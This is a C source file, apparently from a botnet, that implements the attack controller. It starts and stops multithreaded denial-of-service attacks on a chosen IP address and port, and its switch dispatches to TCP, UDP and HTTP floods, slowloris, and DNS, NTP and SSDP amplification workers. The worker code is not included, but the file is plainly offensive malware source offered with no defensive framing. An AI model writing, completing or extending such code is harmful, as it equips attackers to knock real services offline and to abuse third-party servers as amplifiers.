#include "../../include/botnet.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <arpa/inet.h>

volatile int attack_running = 0;
static pthread_t *attack_threads = NULL;
static int num_threads = 0;

// Use a static struct to safely store target info for the duration of the attack
static struct target current_target;

void attack_start(struct attack *attack) {
    if (attack_running) {
        printf("[-] Attack already in progress.\n");
        return;
    }

    // Copy the volatile target data from the stack to our persistent static struct
    memcpy(&current_target, &attack->target, sizeof(struct target));

    printf("[*] Starting attack type %d on %s:%d with %d threads.\n", 
           attack->type, inet_ntoa(*(struct in_addr *)&current_target.addr), ntohs(current_target.port), attack->threads);

    attack_running = 1;
    num_threads = attack->threads;
    attack_threads = malloc(num_threads * sizeof(pthread_t));
    if (!attack_threads) {
        perror("malloc");
        attack_running = 0;
        return;
    }

    void *(*attack_func)(void *) = NULL;

    switch (attack->type) {
        case 1: attack_func = tcp_flood_worker; break;
        case 2: attack_func = udp_flood_worker; break;
        case 3: attack_func = http_flood_worker; break;
        case 4: attack_func = slowloris_worker; break;
        case 5: attack_func = dns_amp_worker; break;
        case 6: attack_func = ntp_amp_worker; break;
        case 7: attack_func = ssdp_amp_worker; break; // New SSDP Amplification Attack
        default:
            printf("[-] Unknown attack type\n");
            attack_running = 0;
            free(attack_threads);
            return;
    }

    // Pass the pointer to the *static* struct to the threads
    for (int i = 0; i < num_threads; i++) {
        if (pthread_create(&attack_threads[i], NULL, attack_func, (void *)&current_target) != 0) {
            perror("pthread_create");
        }
    }

    printf("[+] Attack started.\n");
}

void attack_stop_all() {
    if (!attack_running) {
        printf("[-] No attack is currently running.\n");
        return;
    }

    printf("[*] Stopping all attacks...\n");
    attack_running = 0;

    for (int i = 0; i < num_threads; i++) {
        pthread_join(attack_threads[i], NULL);
    }

    free(attack_threads);
    attack_threads = NULL;
    num_threads = 0;

    printf("[+] All attacks stopped.\n");
}
